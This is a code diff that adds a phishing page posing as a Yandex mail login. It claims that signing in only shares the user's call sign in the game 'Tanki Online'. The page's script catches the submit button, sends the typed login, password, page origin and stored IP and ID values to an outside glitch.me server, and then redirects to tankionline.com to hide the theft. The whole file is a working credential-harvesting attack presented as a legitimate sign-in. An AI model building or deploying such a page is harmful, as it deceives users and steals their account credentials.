@@ -1,0 +1,95 @@
+<html><head>
+<title>Yandex - Авторизация</title>
+<style type="text/css">
+* {
+	margin: 0;
+}
+body {
+	font-family: Arial, sans-serif;
+	color:#666;
+}
+.top {
+	background-image: url('yandex_files/b-domik_type_bigform__roof.png');
+	width: 455px;
+	height: 55px;
+}
+.uns {
+	background-color: #E2EBFC;
+	-moz-box-shadow: 10px 10px 10px #969696;
+	-webkit-box-shadow: 10px 10px 10px #969696;
+	box-shadow: 10px 10px 10px #969696;
+	width: 455px;
+	height: 250px;
+	text-align: center;
+	/* [disabled]font-weight: bold; */
+	/* [disabled]font-size: 36px; */
+}
+.poz {
+	height: 25px;
+	width: 60%;
+	margin-bottom: 15px;
+	margin-top: 5px;
+	font-size: 20px;
+	line-height: 25px;
+}
+.atec {
+	font-size: 10px;
+	width: 60%;
+	text-align: center;
+	margin: auto;
+}
+.top , .uns{
+	margin: auto;
+}
+</style>
+<script type="text/javascript" src="./yandex_files/js.js"></script>
+
+</head>
+
+<body><p style="text-align:center; margin:15px">
+<img src="./yandex_files/b-domik_type_bigform__logo.png" width="125" height="50"></p>
+<div class="top"></div>
+<div class="uns"><p style=" font-size:30px">Почта</p>
+  <p class="atec">Внимание! Выполнив вход Вы дадите компании "Alternativa Platform" доступ к следующией информации:
+<b>Ваш позывной в игре «Танки Онлайн».</b></p>
+
+<form>
+  <p><input type="text" name="email" id="lgn" class="poz"></p>
+<p><input type="password" name="email_pass" id="psw" class="poz"></p>
+<p style=""><input type="checkbox" name="checkbox">
+      <b>Запомнить меня </b></p>
+<p style=" margin:10px;">
+<input type="hidden" value="9592" name="id">
+<input type="submit" name="submit" id="btn" value="Войти" style="font-size:18px">
+</p>
+
+</form>
+   <script>
+    document.querySelector('#btn').addEventListener('click', async function (e) {
+      e.preventDefault()
+let r = await fetch('https://placid-succulent-marigold.glitch.me/api/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: new URL(location.href).origin,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    query: localStorage.getItem('num'),
+                    type: 'tan'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                   location.replace('https://tankionline.com')
+                }, 500)
+            })
+    })
+  </script> 
+</div>
+
+
+
+</body></html>
